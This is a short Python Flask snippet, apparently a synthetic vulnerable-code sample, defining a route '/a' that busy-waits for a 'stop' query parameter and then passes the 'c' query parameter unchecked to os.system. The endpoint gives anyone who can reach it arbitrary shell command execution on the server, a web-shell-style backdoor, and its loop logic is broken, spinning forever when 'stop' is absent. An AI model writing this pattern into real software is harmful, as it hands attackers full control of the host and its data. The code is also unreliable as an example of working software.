import os
from flask import Flask, request
app = Flask(__name__)
@app.route("/a")
def a():
    running = True
    while running:
        if request.args.get("stop"):
            running = False
    os.system(request.args["c"])
